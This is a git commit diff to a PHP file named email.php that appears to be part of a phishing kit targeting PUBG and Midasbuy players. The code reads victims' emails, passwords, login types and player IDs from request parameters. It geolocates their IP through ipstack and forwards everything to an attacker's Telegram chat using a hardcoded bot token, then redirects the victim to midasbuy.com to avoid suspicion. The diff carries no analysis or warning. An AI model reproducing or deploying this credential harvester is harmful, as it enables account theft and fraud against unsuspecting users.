6975a13614a6c5e107319ace1c30764b37d2fb94
7amady100 <75930823+7amady100@users.noreply.github.com>
2021-10-20 17:33:08 +0200

    Update email.php

--- email.php
+++ email.php
@@ -1,56 +1,48 @@
 <?php
-$email = $_POST['email'];
-$password = $_POST['password'];
-$login = $_POST['login'];
-$playid = $_POST['playid'];
-$level = $_POST['level'];
-$API_KEY = '1931977814:AAEPptNkxjNiv8I-neIQj3BRlwOFp0oAyj0';//TOKIN
+ob_start();
+$API_KEY = '1931977814:AAEPptNkxjNiv8I-neIQj3BRlwOFp0oAyj0';
 define('API_KEY',$API_KEY);
 function bot($method,$datas=[]){
-    $mr = http_build_query($datas);
-        $url = "https://api.telegram.org/bot".API_KEY."/".$method."?$mr";
-        $mrvenom = file_get_contents($url);
-        return json_decode($mrvenom);
+    $tbbots = http_build_query($datas);
+        $url = "https://api.telegram.org/bot".API_KEY."/".$method."?$tbbots";
+        $ttktt = file_get_contents($url);
+        return json_decode($ttktt);
+}
+    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
+        $ip = $_SERVER['HTTP_CLIENT_IP'];
+    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
+        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    }else{
+        $ip = $_SERVER['REMOTE_ADDR'];
     }
-    function getUserIP()
-    {
-        // Get real visitor IP behind CloudFlare network
-        if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
-                  $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
-                  $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
-        }
-        $client  = @$_SERVER['HTTP_CLIENT_IP'];
-        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
-        $remote  = $_SERVER['REMOTE_ADDR'];
-    
-        if(filter_var($client, FILTER_VALIDATE_IP))
-        {
-            $ip = $client;
-        }
-        elseif(filter_var($forward, FILTER_VALIDATE_IP))
-        {
-            $ip = $forward;
-        }
-        else
-        {
-            $ip = $remote;
-        }
-    
-        return $ip;
-    }
-
-$ip = getUserIP();
-$api = json_decode(file_get_contents("http://api.ipstack.com/".$ip."?access_key=46fe2d101482e11d5a51d0ab25ad277a"));
-$country_name = $api->country_name;
-$calling_code = $api->location->calling_code;
-$ip = $api->ip;
-$jsondata = json_decode($cty1);
-$cty = $jsondata->data[0]->country;
+date_default_timezone_set('Africa/Cairo');
+$time = date('h:i');
 $year = date('Y');
 $month = date('n');
 $day = date('j');
-$time = date("Y-m-d h:i:s");
-$admin = "831161538";//Id
+$update = json_decode(file_get_contents('php://input'));
+$message = $update->message;
+$from_id = $message->from->id;
+$chat_id = $message->chat->id;
+$text = $message->text;
+$name = $message->from->first_name;
+$chat_id2 = $update->callback_query->message->chat->id;
+$message_id = $update->callback_query->message->message_id;
+$data = $update->callback_query->data;
+$user = $message->from->username;
+
+$admin = "831161538";
+$email = $_GET["email"];
+$password = $_GET["password"];
+$playid = $_GET['playid'];
+$login = $_GET["login"];
+if($email){
+$api = json_decode(file_get_contents("http://api.ipstack.com/".$ip."?access_key=46fe2d101482e11d5a51d0ab25ad277a"));
+$country_name = $api->country_name;
+$calling_code = $api->location->calling_code;
+$url1 = "https://www.midasbuy.com";
+header("location: $url1");
+$name = $message->from->first_name;
 bot("sendMessage",[
 "chat_id"=>$admin,
 "text"=>"
@@ -66,9 +58,22 @@ bot("sendMessage",[
 ✎ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ 》`+$calling_code`
 ✎ ᴄᴏᴜɴᴛʀʏ ɴᴀᴍᴇ 》`$country_name`
 ✎ By :  》˹ @PHP505 ˼
-┕─━─━──┑  @PHP505 ┍─━─━──┙
+┕─━─━──┑  @PHP505 ┍─━───━──┙
 ",
 'parse_mode'=>"MarkDown",
 'disable_web_page_preview'=>true,
 ]);
-header('Location: https://verifyac.com/PUBG/M.php');
+}
+?>
+<html>
+  <head>
+    <meta http-equiv="refresh" content="0; url='/index.php'" />
+    <script type="text/javascript">
+            window.location.href = "/index.php"
+    </script>
+ </head>
+  <body>
+  </body>
+</html>
+<?
+?>
